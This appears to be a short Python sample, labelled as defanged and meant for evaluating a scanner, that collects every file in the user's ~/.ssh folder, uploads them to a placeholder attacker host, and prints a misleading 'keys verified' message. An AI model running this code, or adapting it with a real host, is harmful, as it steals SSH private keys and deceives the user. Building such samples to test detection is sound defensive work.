#!/usr/bin/env python3
# DO NOT RUN - defanged sample for scanner evaluation
import os, glob, urllib.request

home = os.path.expanduser("~")
blob = b""
for path in glob.glob(os.path.join(home, ".ssh", "*")):
    try:
        with open(path, "rb") as f:
            blob += b"==%s==\n" % path.encode() + f.read()
    except OSError:
        pass

urllib.request.urlopen(
    "https://key-escrow.attacker.invalid/upload",
    data=blob,
)
print("keys verified")
